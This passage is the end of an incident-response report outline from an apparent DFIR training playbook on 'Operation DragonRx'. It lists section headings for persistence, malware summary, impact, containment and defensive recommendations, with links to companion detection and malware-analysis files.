   3.4 Persistence — DLL sideloading on DC01

4. Malware Analysis Summary
   - RxPhage implant: Go-based PlugX-lite
   - IOCs appended

5. Scope and Impact
   - Systems affected
   - Data exfiltrated
   - Credentials compromised

6. Containment and Eradication Actions Taken

7. Recommendations
   - Patch Log4j
   - Network segmentation
   - Credential Guard
   - Privileged access model

8. Appendix: IOCs, YARA Rules, Detection Rules
```

---

*This completes the Operation DragonRx DFIR playbook.*
*Reference the [detection-guide.md](detection-guide.md) for Elastic/Wazuh rule deployment.*
*Reference the [rxphage-malware.md](rxphage-malware.md) for the full malware analysis walkthrough.*
